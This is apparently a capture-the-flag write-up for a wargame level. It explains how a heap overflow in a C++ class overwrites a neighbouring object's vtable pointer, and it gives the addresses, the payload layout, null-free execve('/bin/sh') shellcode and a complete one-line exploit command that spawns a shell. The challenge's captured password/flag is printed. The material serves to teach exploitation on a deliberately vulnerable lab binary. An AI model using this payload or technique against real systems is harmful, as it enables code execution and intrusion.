# 🎯 Level9 - C++ Vtable Hijacking

![Helldivers C++ Warfare](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExbWpoMWQ4cjQ0ZWU0M2hraHpsenloM2E4eTN4Y3hpaTIwZHgybmVpZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/rTAVMVAps9zsFINvxI/giphy.gif)

Object-oriented exploitation - hijack virtual function tables! 🔥

## 📋 Binary Analysis

### Class N Structure

```cpp
class N {
public:
    // Memory layout (108 bytes):
    // +0x00: vtable pointer (4 bytes)
    // +0x04: annotation buffer (100 bytes)
    // +0x68: int value (4 bytes)
    
    char annotation[100];
    int value;
    
    N(int n);
    void setAnnotation(char *str);
    int operator+(N &other);
    int operator-(N &other);
};
```

### Vulnerable Method

```cpp
void N::setAnnotation(char *str)
{
    memcpy(annotation, str, strlen(str));  // ⚠️ No bounds checking!
}
```

### Main Function

```cpp
int main(int argc, char **argv)
{
    N *obj1 = new N(5);  // heap: ~0x804a008
    N *obj2 = new N(6);  // heap: ~0x804a078
    
    obj1->setAnnotation(argv[1]);  // ⚠️ Overflow can reach obj2!
    obj2->operator+(*obj1);        // ⚠️ Virtual call uses corrupted vtable!
    
    return 0;
}
```

## 🚨 The Vulnerability

**Buffer overflow + vtable hijacking:**
- `setAnnotation()` copies without bounds check
- obj1's annotation buffer (100 bytes) can overflow into obj2
- obj2's vtable pointer (first 4 bytes of object) gets overwritten
- Virtual function call uses corrupted vtable → arbitrary code execution

**Constraint:** `strlen()` stops at null bytes, so all addresses must be null-free.

## 🎯 Address Discovery

### Step 1: Run ltrace

```bash
$ ltrace ./level9 AAAA
_Znwj(108, ...)  = 0x804a008  ← obj1
_Znwj(108, ...)  = 0x804a078  ← obj2
```

### Step 2: Calculate addresses

```
obj1 base:              0x804a008
obj1 annotation buffer: 0x804a00c (obj1 + 4) ← shellcode here
obj2 base:              0x804a078
obj2 vtable pointer:    0x804a078 (obj2 + 0) ← overwrite target
obj2 annotation buffer: 0x804a07c (obj2 + 4) ← use as fake vtable

Distance: 0x804a078 - 0x804a00c = 108 bytes
```

### Binary addresses (from Ghidra)

- Original vtable: `0x08048848`

### Final payload addresses

| Address | Encoding | Purpose |
|---------|----------|---------|
| `0x0804a00c` | `\x0c\xa0\x04\x08` | Shellcode location (obj1 annotation buffer) |
| `0x0804a07c` | `\x7c\xa0\x04\x08` | Fake vtable location (obj2 annotation buffer) |

Both are null-free! ✅

## 🔧 The Exploit Strategy

### What is a Vtable?

A **vtable (virtual table)** is a mechanism C++ uses to implement polymorphism and virtual functions.

**The Concept:**

When a C++ class has virtual functions, the compiler creates a hidden table of function pointers called a **vtable**. Each object of that class stores a pointer to this table as its first member.

**Memory Layout:**

```
C++ Object in Memory:
┌─────────────────────────────────┐
│ vtable pointer    [offset +0]   │ ← Points to vtable (4 bytes)
├─────────────────────────────────┤
│ member data       [offset +4]   │ ← Class member variables
│ ...                             │
└─────────────────────────────────┘

Vtable (in .rodata section):
┌─────────────────────────────────┐
│ function pointer [vtable +0]    │ → Address of method1()
├─────────────────────────────────┤
│ function pointer [vtable +4]    │ → Address of method2()
├─────────────────────────────────┤
│ function pointer [vtable +8]    │ → Address of method3()
└─────────────────────────────────┘
```

**How Virtual Calls Work:**

```cpp
obj->virtualMethod();  // C++ code
```

Translates to assembly:
```asm
mov edx, [obj]      ; 1. Load vtable pointer from object
mov edx, [edx]      ; 2. Load function pointer from vtable[0]
call edx            ; 3. Call the function
```

**Why This Matters for Exploitation:**

If we can overwrite an object's vtable pointer, we control where the program looks for function addresses. By pointing it to our controlled memory containing a shellcode address, we can hijack execution when a virtual function is called.

This is exactly what we do in level9: overwrite `obj2`'s vtable pointer to point to `obj2`'s own annotation buffer (which we control), and place our shellcode address there.

### C++ Virtual Call Mechanism

**Normal call:** `obj->method()` compiles to:
```asm
mov edx, [obj]      ; Load vtable pointer from object
mov edx, [edx]      ; Load function pointer from vtable
call edx            ; Call function
```

**Two indirections:** object → vtable → function

**Our exploit:** Overwrite obj2's vtable pointer to point to our controlled data (obj2's own annotation buffer), which contains our shellcode address.

### Memory Layout

**Before overflow:**
```
0x804a00c: obj1 annotation (100 bytes)
           └─ overflow 108 bytes ─┐
0x804a078: obj2 vtable → 0x08048848
0x804a07c: obj2 annotation
```

**After overflow:**
```
0x804a00c: [shellcode][padding..........]
           └───────── 108 bytes ─────────┘
0x804a078: [0x0804a07c] ← corrupted vtable pointer
0x804a07c: [0x0804a00c] ← fake vtable[0] = shellcode address
```

**Exploit flow:**
1. Write 116 bytes to obj1 annotation buffer
2. Bytes 108-111 overwrite obj2's vtable → point to `0x0804a07c`
3. Bytes 112-115 write to `0x0804a07c` → place shellcode address `0x0804a00c`
4. Call `obj2->operator+()` → reads corrupted vtable → jumps to shellcode

### Payload Structure

```
[24-byte shellcode] + [84-byte padding] + [fake_vtable_ptr] + [shellcode_addr]
        ↓                    ↓                  ↓                   ↓
    0x804a00c           fills space        0x804a07c           0x804a00c
    (bytes 0-23)      (bytes 24-107)    (bytes 108-111)     (bytes 112-115)
```

| Bytes | Content | Purpose |
|-------|---------|---------|
| 0-23 | Shellcode (24 bytes) | Executes `/bin/sh` |
| 24-107 | Padding (`\x90` * 84) | Fill space to reach offset 108 |
| 108-111 | `\x7c\xa0\x04\x08` | Fake vtable pointer → obj2's annotation buffer |
| 112-115 | `\x0c\xa0\x04\x08` | Shellcode address → obj1's annotation buffer |

**Why we need 2 addresses (fake vtable):**
- Virtual calls use double indirection: `obj → vtable → function`
- Can't point vtable directly to shellcode (CPU would read FROM shellcode bytes)
- Must point vtable to controlled memory containing the shellcode address
- Clever: we use obj2's own annotation buffer as the fake vtable

## 🔄 Complete Execution Flow

### Byte-by-Byte Payload Breakdown

| Offset | Size | Content | Purpose |
|--------|------|---------|---------|
| 0-23 | 24 bytes | Shellcode | execve("/bin/sh") code at 0x804a00c |
| 24-107 | 84 bytes | `\x90` (NOP) | Padding to reach obj2 |
| 108-111 | 4 bytes | `\x7c\xa0\x04\x08` | Overwrite obj2 vtable → 0x804a07c |
| 112-115 | 4 bytes | `\x0c\xa0\x04\x08` | Write to 0x804a07c (fake vtable entry) |

**Total: 116 bytes**

### Memory State After Overflow

```
Heap Layout:

0x804a008: obj1 vtable  → 0x08048848 (unchanged)
0x804a00c: obj1 buffer  → [shellcode (24 bytes)][NOPs (84 bytes)]...
           │              └─ Overflow continues ─────────────────┐
           │                                                     │
0x804a078: obj2 vtable  → 0x0804a07c ← CORRUPTED! Points to ────┤
0x804a07c: obj2 buffer  → 0x0804a00c ← Fake vtable with shellcode addr
```

### Virtual Call Execution

When `obj2->operator+()` is called:

```asm
mov eax, [obj2]        ; Load obj2 address → 0x804a078
mov edx, [eax]         ; Load vtable pointer → 0x0804a07c (FAKE!)
mov edx, [edx]         ; Load function pointer → 0x0804a00c (SHELLCODE!)
call edx               ; Execute shellcode → /bin/sh
```

**Double indirection:**
```
obj2 (0x804a078) → fake vtable (0x804a07c) → shellcode (0x804a00c)
```

### Why Double Indirection is Required

```
❌ Wrong: obj2 vtable → 0x0804a00c (shellcode)
   Problem: CPU reads FROM shellcode bytes as if they were a vtable → garbage address

✅ Correct: obj2 vtable → 0x0804a07c (fake vtable containing shellcode address)
   Success: CPU reads shellcode address from fake vtable → jumps to shellcode
```

The vtable must point to a **table of addresses**, not directly to code.

### Shellcode

We use the same null-byte-free shellcode from **level2** (24 bytes):

```
\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

> 💡 For detailed assembly breakdown, see [level2 documentation](../../level2/Ressources/README.md#the-shellcode).
>
> **Source:** [Exploit-DB #42428](https://www.exploit-db.com/shellcodes/42428) by Touhid M.Shaikh

## 💣 Execute the Exploit

```bash
./level9 $(python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*84 + "\x7c\xa0\x04\x08" + "\x0c\xa0\x04\x08"')
```

**Expected output:**
```bash
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

---

> 💡 **Pro Tip**: When exploiting C++ programs, always check the vtable layout first. Understanding the object model is key to crafting precise exploits!

> ⚠️ **Security Note**: Modern C++ protections include CFI (Control Flow Integrity), vtable verification, and read-only vtables. Safe practices: use `std::string`, enable sanitizers, prefer smart pointers over raw memory management.

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
